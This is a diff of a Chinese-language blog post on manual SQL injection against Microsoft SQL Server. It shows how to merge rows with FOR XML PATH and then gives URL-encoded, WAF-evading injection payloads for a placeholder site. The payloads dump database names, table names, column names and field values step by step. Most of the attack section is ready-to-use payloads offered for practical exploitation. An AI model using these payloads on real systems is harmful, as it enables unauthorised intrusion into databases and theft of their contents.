@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "SQL-Server-SQL-Inject"
+title:  "SQL Server手工注入"
 ---
 ---
 ## 背景
@@ -63,8 +63,8 @@ https://payloads.online/archivers/2020-03-02/3#stuff%E4%B8%8Exml-path
 还有国外的一篇文章:
 https://www.sqlshack.com/for-xml-path-clause-in-sql-server/
 
-发现了可以用 FOR XML PATH将SQL语句返回的多行数据合并成单行  
-关于FOR XML PATH的文档：
+发现了可以用 FOR XML将SQL语句返回的多行数据合并成单行  
+关于FOR XML的文档：
 https://docs.microsoft.com/zh-cn/sql/relational-databases/xml/for-xml-sql-server?view=sql-server-ver15  
 
 >SELECT 查询将结果作为行集返回。 （可选操作）您可以通过在 SQL 查询中指定 FOR XML 子句，从而将该查询的正式结果作为 XML 来检索。 FOR XML 子句可以用在顶级查询和子查询中。 顶级 FOR XML 子句只能用在 SELECT 语句中。 而在子查询中，FOR XML 可以用在 INSERT、UPDATE 和 DELETE 语句中。 FOR XML 还可以用在赋值语句中。  
@@ -76,7 +76,10 @@ https://docs.microsoft.com/zh-cn/sql/relational-databases/xml/for-xml-sql-server
 - PATH
 
 这里我们可以用较为简单的PATH模式
-`SELECT  Name from Master..SysDatabases  FOR  XML PATH`
+
+```sql
+SELECT  Name from Master..SysDatabases  FOR  XML PATH
+```
 返回
 ```sql
 <row><Name>master</Name></row><row><Name>tempdb</Name></row><row><Name>model</Name></row><row><Name>msdb</Name></row>...
@@ -90,7 +93,11 @@ SELECT  Name from Master..SysDatabases  FOR  XML PATH('')
 ```sql
 <Name>master</Name><Name>tempdb</Name><Name>model</Name>....
 ```
-虽然说已经返回单行数据，但是有很多标签看着还是不舒服，参考了倾旋的方法，用 '，' 进行拼接，于是我们可以:
+虽然说已经返回单行数据，但是有很多标签看着还是不舒服，参考了倾旋的方法，他是用
+```sql
+'['+name+'],'
+```
+这种方式进行拼接，我这里为了减少payload长度，直接用 '，' 进行拼接:
 ```sql
 SELECT name+',' FROM(SELECT name from Master..SysDatabases) a  FOR  XML PATH('')
 ```
@@ -106,7 +113,7 @@ https://docs.microsoft.com/zh-cn/sql/t-sql/functions/stuff-transact-sql?view=sql
 ```sql
 SELECT STUFF((SELECT name+',' FROM(SELECT name from Master..SysDatabases) a  FOR  XML PATH('') ), 1,0, '')
 ```
-返回和之前的是一样的，于是我在实测中便不采用这种方法。
+我在本地测试了下，用这种方式的返回和不加STUFF函数的结果是一样的，于是我在实测中便不采用这种方法。
 
 ---
 ## 实战
@@ -132,7 +139,16 @@ SQL Server数据库不像MYSQL有內联注释可以绕过很多软waf，所以�
 xxx.com?abc=a%27%0aand%0a1=(SELECT%0aname%2b%27,%27%0aFROM(SELECT%0aname%0afrom%0aMaster..SysDatabases)%0a%0aFOR%0a%0aXML%0aPATH(%27%27))a%0aand%0a%271%27=%271
 ```
 成功返回库名
-接着开始注表名
+接着开始注表名,在SQL Server中查询表名的语句是:
+```sql
+SELECT name+',' FROM(SELECT name from xxx.sys.all_objects where type='U')a FOR  XML PATH('')
+```
+这里
+```sql
+xxx.sys.all_objects
+```
+'xxx'指的是数据库名，执行成功后返回xxx库的表名
+那么我们运用到实战:
 ```html
 xxx.com?abc=a%27%0aand%0a1=(SELECT%0aname%2b%27,%27%0aFROM(SELECT%0aname%0afrom%0axxx.sys.all_objects%0awhere%0atype=%27U%27)a%0aFOR%0a%0aXML%0aPATH(%27%27))%0aand%0a%271%27=%271
 ```
@@ -140,7 +156,7 @@ xxx.com?abc=a%27%0aand%0a1=(SELECT%0aname%2b%27,%27%0aFROM(SELECT%0aname%0afrom%
 
 注字段名的语句，table_name指的是表名
 ```html
-select name+',' from (SELECT Name FROM SysColumns WHERE id=Object_Id('table_name'))a for xml path('')
+select name+',' from (SELECT Name FROM SysColumns WHERE id=Object_Id('table_name'))a FOR XML PATH('')
 ```
 那么运用到实战:
 ```html
@@ -150,9 +166,9 @@ xxx.com?abc=a%27%0aand%0a1=(select%0aname%2b%27,%27%0afrom%0a(SELECT%0aName%0aFR
 
 接着注字段的值
 ```html
-SELECT column_name+',' FROM(SELECT column_name from dbo.table_name)a FOR  XML PATH('')
+SELECT column_name+',' FROM(SELECT column_name from 数据库名.dbo.table_name)a FOR  XML PATH('')
 ```
-这里column_name指的是字段名,table_name指的是表名   <br>
+这里column_name指的是字段名,table_name指的是表名，如果不指定数据库名就会查当前数据库   <br>
 运用到实战
 ```html
 xxx.com?abc=a%27%0aand%0a1=(SELECT%0atop%0a5%0acolumn_name%2b%27,%27%0aFROM(SELECT%0acolumn_name%0afrom%0adbo.table_name)a%0aFOR%0a%0aXML%0aPATH(%27%27))%0aand%0a%271%27=%271
